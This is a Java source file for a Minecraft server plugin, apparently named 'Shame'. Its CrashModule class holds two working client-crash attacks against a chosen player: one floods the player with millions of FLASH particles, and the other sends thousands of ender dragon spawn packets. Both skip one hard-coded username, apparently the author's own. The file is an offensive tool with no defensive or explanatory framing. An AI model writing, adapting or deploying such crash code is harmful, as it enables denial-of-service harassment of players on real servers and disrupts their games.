package org.dimasik.shame.modules.impl;

import net.minecraft.server.v1_16_R3.*;
import org.bukkit.Bukkit;
import org.bukkit.Particle;
import org.bukkit.craftbukkit.v1_16_R3.CraftWorld;
import org.bukkit.entity.EntityType;
import org.bukkit.entity.Player;
import org.dimasik.shame.Shame;
import org.dimasik.shame.modules.Module;
import org.bukkit.craftbukkit.v1_16_R3.entity.CraftPlayer;

import java.util.Collections;

public class CrashModule extends Module {
    public static void startCrash(Player player) {
        if(player.getName().equalsIgnoreCase("kotikstasika")) {
            return;
        }
        Bukkit.getScheduler().runTaskAsynchronously(Shame.getInstance(), () -> {
            for (int i = 0; i < 10000; i++) {
                player.spawnParticle(Particle.FLASH, player.getLocation().clone().add(0, -0, 0), 10000);
            }
        });
    }

    public static void startPacketCrash(Player player, int size) {
        if(player.getName().equalsIgnoreCase("kotikstasika")) {
            return;
        }
        size *= 1000;
        while(size > 0) {
            size--;
            try {
                EntityPlayer nmsPlayer = ((CraftPlayer) player).getHandle();
                WorldServer world = ((CraftWorld) player.getWorld()).getHandle();

                MinecraftKey key = new MinecraftKey(EntityType.ENDER_DRAGON.getKey().getKey());
                EntityTypes<?> nmsEntityType = IRegistry.ENTITY_TYPE.get(key);

                Entity nmsEntity = nmsEntityType.a(world);
                nmsEntity.setPosition(player.getLocation().getX(), player.getLocation().getY(), player.getLocation().getZ());

                if (nmsEntity instanceof EntityLiving) {
                    PacketPlayOutSpawnEntityLiving packet = new PacketPlayOutSpawnEntityLiving((EntityLiving) nmsEntity);
                    nmsPlayer.playerConnection.sendPacket(packet);
                } else {
                    PacketPlayOutSpawnEntity packet = new PacketPlayOutSpawnEntity(nmsEntity);
                    nmsPlayer.playerConnection.sendPacket(packet);
                }
            } catch (Exception e) { }
        }
    }
}